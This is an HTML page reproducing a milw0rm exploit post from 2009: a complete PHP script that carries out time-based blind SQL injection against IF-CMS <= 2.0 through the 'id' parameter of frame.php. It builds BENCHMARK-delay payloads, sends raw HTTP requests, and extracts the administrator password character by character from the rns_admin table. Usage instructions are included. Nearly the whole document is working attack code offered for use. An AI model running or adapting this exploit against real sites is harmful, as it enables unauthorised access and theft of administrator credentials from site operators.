<html><head><title>IF-CMS <= 2.0 (frame.php id) Blind SQL Injection Exploit</title></head><pre>--+++=======================================================+++--
--+++====== IF-CMS &lt;= 2.0 Blind SQL Injection Exploit ======+++--
--+++=======================================================+++--

&lt;?php

function query ($username, $char, $pos)
{
	//Increase benchmark when exploit prints uncorrect passwords

	$query = &quot;x' OR IF ((ASCII(SUBSTRING((SELECT pass FROM rns_admin WHERE &quot;.
		 &quot;nick = '{$username}'),{$pos},1))={$char}), BENCHMARK(100000000,CHAR(0)),0) OR '1' = '2&quot;;
	$query = str_replace (&quot; &quot;, &quot;%20&quot;, $query);
	$query = str_replace (&quot;'&quot;, &quot;%27&quot;, $query);
	return $query;
}

function exploit ($hostname, $path, $username, $char, $pos)
{
	$char = ord ($char);
	$fp = fsockopen ($hostname, 80);
	$get =  &quot;GET {$path}/frame.php?id=&quot;. query ($username, $char, $pos) . &quot; HTTP/1.1\r\n&quot;.
		&quot;Host: {$hostname}\r\n&quot;.
		&quot;Connection: Close\r\n\r\n&quot;;
		$a = time ();
	fputs ($fp, $get);
	while (!feof ($fp))
		fgets ($fp, 1024);

	fclose ($fp);
	$a = time () - $a;
	if ($a &gt; 4)
		return true;
	else
		return false;

}

function usage ()
{
	echo &quot;\nIF-CMS &lt;= 2.0 Blind SQL Injection Exploit&quot;.
	     &quot;\n[+] Author  : darkjoker&quot;.
	     &quot;\n[+] Site    : http://darkjoker.net23.net&quot;.
	     &quot;\n[+] Download: http://downloads.sourceforge.net/if-cms/If-CMS-2.07.zip?modtime=1088812800&amp;big_mirror=0&quot;.
	     &quot;\n[+] Usage   : php xpl.php &lt;hostname&gt; &lt;path&gt; &lt;username&gt;&quot;.
	     &quot;\n[+] Ex.     : php xpl.php localhost /IF-CMS root&quot;.
	     &quot;\n\n&quot;;
	exit ();
}

if ($argc != 4)
	usage ();
$hostname = $argv [1];
$path = $argv [2];
$user = $argv [3];
//Edit this keylist when returned password is incomplete and add other characters you want
$key = &quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&quot;;
$chr = 0;
$pos = 1;
echo &quot;[+] Password: &quot;;
while ($chr &lt; strlen ($key))
{
	if (exploit ($hostname, $path, $user, $key [$chr], $pos))
	{
		echo $key [$chr];
		$chr = 0;
		$pos++;
	}
	else
		$chr++;
}
echo &quot;\n\n&quot;;
?&gt;

# milw0rm.com [2009-02-09]</pre></html>